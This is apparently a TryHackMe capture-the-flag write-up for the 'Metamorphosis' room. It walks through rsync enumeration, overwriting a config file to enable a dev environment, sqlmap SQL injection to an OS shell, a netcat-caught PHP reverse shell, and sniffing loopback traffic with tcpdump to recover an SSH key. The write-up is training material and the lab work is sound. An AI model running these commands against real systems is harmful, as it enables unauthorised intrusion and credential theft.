# Metamorphosis TryHackMe Writeup

## Enumeration
```
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack
80/tcp  open  http         syn-ack
139/tcp open  netbios-ssn  syn-ack
445/tcp open  microsoft-ds syn-ack
873/tcp open  rsync        syn-ack
```

The website didn't have anything particularly interesting on it and neither did the SMB shares.
Rsync on the other-hand sounds promising. There's some information on pentesting rsync on [hacktricks](https://book.hacktricks.xyz/pentesting/873-pentesting-rsync)  

![image](https://user-images.githubusercontent.com/65077960/126723108-e62bb428-28ec-4c2c-8796-d5a2d9e6e305.png)

We can connect and perform some manual enumeration:  
![image](https://user-images.githubusercontent.com/65077960/126724275-de9a00a2-b2aa-4ded-bca8-b652c5c3ce3e.png)

We can use the rsync binary to conenct and enumerate directories:
![image](https://user-images.githubusercontent.com/65077960/126724691-e4fddf39-a412-47d4-bab7-d3675d1e8dde.png)

We see there's a lot of configuration files that we can download and look into:  
```
mkdir rsync
rsync -av rsync://10.10.82.247/Conf rsync
```
In the webapp.ini file we see creds for a user called tom.

## User own
> Dev environment is seen on the 404 pages
> 
We can edit the webapp.ini file to give us access to the dev environment, our webapp.ini now looks like this:
```ini
[Web_App]
env = dev 
user = tom
password = <redacted>

[Details]
Local = No

```
We can then sync the malicious webapp.ini using:
```
rsync -av webapp.ini rsync://10.10.229.96/Conf/webapp.ini
```
and access the /admin page
![image](https://user-images.githubusercontent.com/65077960/126726798-7e2c9c62-356d-4097-8ded-171db8c2cddc.png)  

We can use SQL injection to get an os-shell by making a request and saving it in burp and passing it to SQL map: 
```
sqlmap -r userinfo.req --os-shell --level 3 --risk 3 --random-agent
```
![image](https://user-images.githubusercontent.com/65077960/126729305-f5d5295e-1389-4bc0-b27d-d4c80621e534.png)

## Root own

We can upgarde our shell by using wget to download a PHP reverse shell and catch it with netcat. We'll upgrade to a full interactive shell with the following:  
```
python -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+z
stty raw -echo
fg
< Hit enter a couple times >
```
We can run linpeas and see there's not a great deal happening, but there are some ongoing connections that we can sniff. We'll use TCPDump and write to a file: 
```
tcpdump -i lo -w out.pcap -v
```
![image](https://user-images.githubusercontent.com/65077960/126806427-87eacc27-28ba-4638-856d-9bf1a614c6c8.png)

After moving it over to the web server, we can download it and analyze it locally. 
There's some HTTP requests being made that could be interesting, looking into them we find a SSH key:
![image](https://user-images.githubusercontent.com/65077960/126807802-7b26c809-e83d-4c2d-8802-3c597a5ca443.png)

Copy "all visable items" and copy the key into a file. 
> Remember chmod 600 the file and strip the \\n's from the file

![image](https://user-images.githubusercontent.com/65077960/126808113-7ba76c65-7ed6-46bd-a628-3933ab0f8e0a.png)





